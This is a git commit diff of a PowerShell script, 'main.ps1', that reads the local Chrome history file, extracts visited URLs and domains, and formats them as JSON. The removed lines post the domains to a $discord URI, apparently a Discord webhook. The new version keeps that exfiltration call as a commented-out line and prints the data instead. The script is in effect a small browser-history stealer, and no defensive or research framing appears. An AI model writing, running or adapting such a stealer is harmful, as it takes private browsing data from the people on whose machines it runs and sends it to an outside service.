6db9277bed966e3f738ad96888fba68d3eab0b15
jwright420 <125150685+jwright420@users.noreply.github.com>
2023-06-17 16:29:18 -0400

    Update main.ps1
    Complete Overhaul

--- main.ps1
+++ main.ps1
@@ -1,17 +1,34 @@
-$history = Get-Content -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\history" -encoding utf8 | Select-String -Pattern '(htt(p|ps))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' -AllMatches
+$filePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\history"
 
-$decoded = 
-Foreach ($entry in $history){
-	Foreach($subentry in $entry){
-
-		$url = $entry
-			
-		$cleanUrl = $url -replace 'http:\/\/','' -replace 'https:\/\/','' -replace '\/.*','' -replace '[^\p{L}\p{Nd}]', ''
-		$domain = @{
-			'domain' = $cleanUrl
-		}
-		
-	}
-	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($domain | ConvertTo-Json) -Verbose
-	#Write-Host ($domain)
+# Check if the file exists
+if (!(Test-Path $filePath)) {
+    Write-Host "File not found: $filePath"
+    exit
 }
+
+# Read the file contents
+$fileContents = Get-Content -Path $filePath
+
+# Extract URLs using regular expressions
+$urlPattern = 'https?://(?:[-\w]+\.)+[a-zA-Z]{2,9}(?:/[-\w]+)*'
+$urls = $fileContents | Select-String -Pattern $urlPattern -AllMatches | Foreach-Object { $_.Matches.Value }
+
+# Create an array to store the JSON objects
+$jsonObjects = @()
+
+# Generate JSON objects with "domain" key
+$urls | ForEach-Object {
+    $url = $_
+    $domain = [System.Uri]$url | Select-Object -ExpandProperty Host
+    $jsonObject = [PSCustomObject]@{
+        "domain" = $domain
+        "url" = $url
+    }
+    $jsonObjects += $jsonObject
+}
+
+# Convert JSON objects to JSON format
+$jsonData = $jsonObjects | ConvertTo-Json
+
+#Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body $jsonData
+Write-Host $jsonData
